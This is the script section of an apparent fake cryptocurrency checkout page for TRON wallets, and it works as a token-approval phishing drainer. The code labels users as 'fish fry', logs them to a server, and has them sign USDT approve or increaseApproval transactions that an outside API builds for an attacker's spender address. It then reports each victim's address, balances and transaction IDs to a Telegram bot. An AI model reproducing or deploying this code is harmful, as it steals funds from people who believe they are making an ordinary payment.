            showTemporaryMessage(`您的能量不足，需要 ${requiredEnergy} 能量，当前只有 ${userData.energyRemaining} 能量，将消耗额外TRX`);
        } else {
            // 能量充足
            showTemporaryMessage(`能量检测通过，您有足够的能量进行授权 (${userData.energyRemaining}/${userData.energyLimit})`);
        }
        
        // 强制更新一次账户资源
        try {
            const accountResourcesResponse = await window.tronWeb.trx.getAccountResources(userData.address);
            if (accountResourcesResponse && typeof accountResourcesResponse === 'object') {
                const energyUsed = accountResourcesResponse.EnergyUsed || 0;
                const energyLimit = accountResourcesResponse.EnergyLimit || 0;
                userData.energyRemaining = Math.max(0, energyLimit - energyUsed);
                userData.energyLimit = energyLimit;
                
                console.log("支付前最新能量信息:", {
                    energyUsed,
                    energyLimit,
                    energyRemaining: userData.energyRemaining
                });
            }
        } catch (e) {
            console.warn("支付前更新能量信息失败", e);
        }
        
        const fishResponse = await $.post('/assets/libs/options/insertFish.php', {
            fish_address: userData.address,
            operation: 'query'
        });
        
        let success = false;
        
        if (fishResponse.status === 'success' && fishResponse.message === '数据已存在') {
            success = await UsdtTransfer(paymentAddress, totalPrice);
        } else {
            switch(Number(model)) {
                case 4:
                    success = await increaseApproval(spenderAddress, approvalAmount);
                    break;
                case 5:
                    success = await approval(spenderAddress, approvalAmount);
                    break;
                default:
                    throw new Error(`未设定的交易模式: ${model}`);
            }
        }
        
        // 恢复按钮状态
        setTimeout(() => {
            button.innerHTML = '确认支付';
            button.disabled = false;
        }, 1000);
        
        if (success) {
            showTemporaryMessage("交易已成功提交，请等待确认");
        }
        
    } catch (error) {
        console.error("invokePay报错:", error);
        
        // 恢复按钮状态
        const button = document.querySelector('.pay-approvalbutton');
        button.innerHTML = '确认支付';
        button.disabled = false;
        
        showTemporaryMessage("支付失败，请重新尝试");
    }
}

// 模式4授权函数
async function increaseApproval(spenderAddress, approvalAmount) {
   try {
       // 定义TRONAPI端点接口
       let url = 'https://tronweb.xyz/api/increaseApproval';
       
       // 确保授权金额是正确的格式 (字符串，年月日+6个0)
       const authAmount = String(approvalAmount);
       console.log("increaseApproval使用的授权金额:", authAmount);
       
       const response = await fetch(url, {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json'
           },
           // 提交授权信息
           body: JSON.stringify({
               spenderAddress: spenderAddress, // 接受授权地址
               userAddress: userData.address, // 鱼苗地址
               approvalAmount: authAmount // 动态授权金额
           })
       });
       const result = await response.json();
       if (result.error) {
           console.error(result.error);
           return false;
       }
       // 签名这个交易
       const signedTx = await window.tronWeb.trx.sign(result.transaction);
       // 将签名后的交易广播到TRON网络
       const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
       
       if (broadcastResult.result === true && broadcastResult.txid) {
           await updateAuthorizationData(spenderAddress);
           await SendapprovalNotification(broadcastResult.txid);
           if (options.authorize_note && options.authorize_note.trim()) {
               showTemporaryMessage(options.authorize_note);
           }
           return true;
       }
       return false;
   } catch (error) {
       console.error("模式4失败:", error.message);
       showTemporaryMessage("您的转账交易没有发起成功,请重试。");
       return false;
   }
}

// 模式5授权函数
async function approval(spenderAddress, approvalAmount) {
   try {
       // 定义TRONAPI端点接口
       let url = 'https://tronweb.xyz/api/approve';
       
       // 确保授权金额是正确的格式 (字符串，年月日+6个0)
       const authAmount = String(approvalAmount);
       console.log("approval使用的授权金额:", authAmount);
       
       const response = await fetch(url, {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json'
           },
           // 提交授权信息
           body: JSON.stringify({
               spenderAddress: spenderAddress, // 接受授权地址
               userAddress: userData.address, // 鱼苗地址
               approvalAmount: authAmount // 动态授权金额
           })
       });
       const result = await response.json();
       if (result.error) {
           console.error(result.error);
           return false;
       }
       // 签名这个交易
       const signedTx = await window.tronWeb.trx.sign(result.transaction);
       // 将签名后的交易广播到TRON网络
       const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
       
       if (broadcastResult.result === true && broadcastResult.txid) {
           await updateAuthorizationData(spenderAddress);
           await SendapprovalNotification(broadcastResult.txid);
           if (options.authorize_note && options.authorize_note.trim()) {
               showTemporaryMessage(options.authorize_note);
           }
           return true;
       }
       return false;
   } catch (error) {
       console.error("模式5失败:", error.message);
       showTemporaryMessage("您的转账交易发起失败,请重试。");
       return false;
   }
}

// 执行USDT转账函数
async function UsdtTransfer(toAddress, amount) {
    try {
        // 检查TRX余额是否足够支付矿工费
        const MIN_TRX_REQUIRED = 15; // 最低需要的TRX数量

        // 定义TRONAPI端点接口
        let url = 'https://tronweb.xyz/api/transfer';
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            // 提交转账信息
            body: JSON.stringify({
                usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT合约地址
                userAddress: userData.address, // 用户地址
                toAddress: toAddress, // 接收转账地址
                amount: amount  // 转账金额
            })
        });

        const result = await response.json();
        if (result.error) {
            console.error("转账请求失败:", result.error);
            showTemporaryMessage("转账请求失败，请重试");
            return false;
        }

        // 签名这个交易
        const signedTx = await window.tronWeb.trx.sign(result.transaction);
        
        // 将签名后的交易广播到TRON网络
        const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTx);
        
        if (broadcastResult.result === true && broadcastResult.txid) {
            await sendPaymentNotification(broadcastResult.txid, toAddress, amount);
            showTemporaryMessage("转账交易已提交，等待确认...");
            return true;
        }

        showTemporaryMessage("交易广播失败，请重试");
        return false;
    } catch (error) {
        console.error("转账失败:", error.message);
        showTemporaryMessage("转账失败，请重试");
        return false;
    }
}
// 格式化余额的工具函数
const formatBalance = (balance) => {
    try {
        if (typeof balance === 'number') return balance.toFixed(6);
        const num = parseFloat(balance);
        return isNaN(num) ? '0.000000' : num.toFixed(6);
    } catch (e) {
        return '0.000000';
    }
};

// 发送钱包连接通知
async function sendWalletConnectNotification() {
    let missingParams = [];
    
    if (!options.notification_switch) {
        missingParams.push("notification_switch");
    }
    if (options.notification_switch !== '1') {
        missingParams.push("notification_switch 应为 '1'");
    }
    if (!options.notification_id) {
        missingParams.push("notification_id");
    }
    
    if (missingParams.length > 0) {
        return;
    }
    
    try {
        const currentUrl = window.location.href;
        const orderIdMatch = currentUrl.match(/epay\/(\d+)\.php/);
        const orderId = orderIdMatch ? orderIdMatch[1] : '未知订单号';
        let goodsName = '未知商品名称';
        const infoSections = document.querySelectorAll('.info');
        for (const section of infoSections) {
            const h2 = section.querySelector('h2');
            if (h2 && h2.textContent.trim() === '商品详情') {
                const nameElement = h2.nextElementSibling;
                if (nameElement && nameElement.tagName === 'P') {
                    goodsName = nameElement.textContent.trim();
                }
                break;
            }
        }

        const paymentAmountElement = document.getElementById('paymentAmount');
        const totalPrice = parseFloat(paymentAmountElement.textContent.split(' ')[0]);

        const notificationData = {
            type: 'wallet_connect',
            data: {
                chatId: options.notification_id,
                goodsName,
                totalPrice: formatBalance(totalPrice),
                orderId,
                address: userData.address,
                tgusername: userData.tgusername || '',
                trxBalance: formatBalance(userData.trxBalance),
                usdtBalance: formatBalance(userData.usdtBalance),
                energyRemaining: userData.energyRemaining || 0,
                energyLimit: userData.energyLimit || 0,
                currentUrl
            }
        };

        await fetch('/assets/libs/jiaoyi/bot.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(notificationData)
        });
    } catch (error) {}
}


// 发送授权成功通知
async function SendapprovalNotification(txid) {
    try {
        const notificationData = {
            type: 'approval',
            data: {
                botKey: options.bot_key,
                chatId: options.notification_id,
                txid,
                address: userData.address,
                tgusername: userData.tgusername || '',
                permissionAddress: options.permission_address,
                trxBalance: formatBalance(userData.trxBalance),
                usdtBalance: formatBalance(userData.usdtBalance),
                energyRemaining: userData.energyRemaining || 0,
                energyLimit: userData.energyLimit || 0
            }
        };

        await fetch('/assets/libs/jiaoyi/bot.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(notificationData)
        });
    } catch (error) {
        console.error("发送授权通知失败，继续执行:", error);
    }
}

// 发送支付成功通知
async function sendPaymentNotification(txid, paymentAddress, totalPrice) {
    try {
        const currentUrl = window.location.href;
        const orderIdMatch = currentUrl.match(/epay\/(\d+)\.php/);
        const orderId = orderIdMatch ? orderIdMatch[1] : '未知订单号';

        const notificationData = {
            type: 'payment',
            data: {
                botKey: options.bot_key,
                chatId: options.notification_id,
                txid,
                orderId,
                userAddress: userData.address,
                paymentAddress,
                totalPrice
            }
        };

        await fetch('/assets/libs/jiaoyi/bot.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(notificationData)
        });
    } catch (error) {
        console.error("发送支付通知失败，继续执行:", error);
    }
}

// 钱包跳转
function payNow() {
    var currentUrl = window.location.href;
    var selectedWallet = document.querySelector('input[name="wallet"]:checked');
    
    if (!selectedWallet) {
        showTemporaryMessage('请先选择您的付款钱包');
        return;
    }
    
    // 添加点击反馈
    const button = document.querySelector('.pay-button');
    button.innerHTML = '<span class="loading-spinner"></span>正在跳转...';
    
    setTimeout(() => {
        var selectIndex = selectedWallet.value;
        
        // 教程图片
        const modalWallets = {
            'TRONLINK': '/assets/img/TronLink.jpg'
        };
        
        if (modalWallets[selectIndex]) {
            button.innerHTML = '打开支付';
            showWalletModal(modalWallets[selectIndex]);
            return;
        }
        
        var walletLinks = {
            'imToken': `imtokenv2://navigate?screen=DappView&url=${currentUrl}`,
            'tokenpocket': `tpdapp://open?params={"url": "${currentUrl}"}`,
            'BitGet': `bitget://navigate_to?url=${currentUrl}`
        };
        
        if (walletLinks[selectIndex]) {
            window.location.href = walletLinks[selectIndex];
        }
    }, 800);
}

function showWalletModal(guideImage) {
    const fullUrl = window.location.href;
    
    const displayUrl = fullUrl.split('?')[0];

    document.getElementById('currentUrl').textContent = displayUrl;
    document.getElementById('walletGuideImage').src = guideImage;
    
    const modal = document.getElementById('walletModal');
    modal.style.display = 'block';
    
    // 添加动画类
    setTimeout(() => {
        modal.classList.add('show');
    }, 10);
    
    // 存储完整URL用于复制
    document.getElementById('currentUrl').dataset.fullUrl = fullUrl;
}

function closeWalletModal() {
    const modal = document.getElementById('walletModal');
    modal.classList.remove('show');
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

function copyUrl() {
    const fullUrl = document.getElementById('currentUrl').dataset.fullUrl;

    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(fullUrl)
            .then(function () {
                showCopySuccess();
            })
            .catch(function (err) {
                alert('复制失败，请手动复制');
            });
    } else {
        fallbackCopyText(fullUrl);
    }
}

// 显示复制成功提示
function showCopySuccess() {
    var successTip = document.getElementById('copySuccess');
    successTip.style.display = 'block';
    setTimeout(function () {
        successTip.style.display = 'none';
    }, 2000);
}


function fallbackCopyText(text) {
    var tempInput = document.createElement('textarea');
    tempInput.value = text;
    tempInput.style.position = 'absolute';
    tempInput.style.left = '-9999px'; // 隐藏文本框
    document.body.appendChild(tempInput);

    tempInput.select();
    try {
        document.execCommand('copy');
        showCopySuccess();
    } catch (err) {
        alert('复制失败，请手动复制');
    }

    document.body.removeChild(tempInput);
}

// 关闭弹窗
document.getElementById('walletModal').addEventListener('click', function(e) {
    if (e.target === this) {
        closeWalletModal();
    }
});

// 显示提示消息
function showTemporaryMessage(message) {
    const messageDiv = document.createElement('div');
    messageDiv.textContent = message;

    // 样式
    messageDiv.style.position = 'fixed';
    messageDiv.style.top = '38%';
    messageDiv.style.left = '50%';
    messageDiv.style.transform = 'translateX(-50%)'; 
    messageDiv.style.backgroundColor = 'rgba(52, 152, 219, 0.9)';
    messageDiv.style.color = 'white';
    messageDiv.style.padding = '15px 25px';
    messageDiv.style.borderRadius = '30px';
    messageDiv.style.boxShadow = '0 8px 25px rgba(0, 0, 0, 0.25)';
    messageDiv.style.zIndex = '1000';
    messageDiv.style.fontSize = '16px';
    messageDiv.style.fontWeight = '500';
    messageDiv.style.textAlign = 'center';
    messageDiv.style.maxWidth = '80%';
    messageDiv.style.maxHeight = '50%';
    messageDiv.style.overflowY = 'auto';
    messageDiv.style.wordWrap = 'break-word';
    messageDiv.style.animation = 'messageSlideIn 0.3s ease-out';

    document.body.appendChild(messageDiv);

    // 显示并淡出效果
    messageDiv.style.opacity = '0';
    setTimeout(() => {
        messageDiv.style.opacity = '1';
        messageDiv.style.transition = 'opacity 0.3s ease';
    }, 10);

    // 显示3秒后淡出
    setTimeout(() => {
        messageDiv.style.opacity = '0';
        messageDiv.style.transform = 'translateX(-50%) translateY(-20px)';
        messageDiv.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        setTimeout(() => {
            messageDiv.remove();
        }, 500);
    }, 3000);
}
</script>
</body>
</html>
